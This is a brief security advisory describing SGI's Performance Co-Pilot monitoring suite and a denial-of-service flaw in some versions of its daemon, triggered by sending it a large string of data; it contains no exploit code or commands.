Performance Co-Pilot (PCP) is a set of services to support system-level performance monitoring developed by SGI. It has traditionally been an IRIX product, however SGI has made it open source and it is now available for Linux systems.

A vulnerability exists in some versions of the PCP daemon. It is possible to cause a denial of service condition by sending the daemon a large string of arbitrary data.
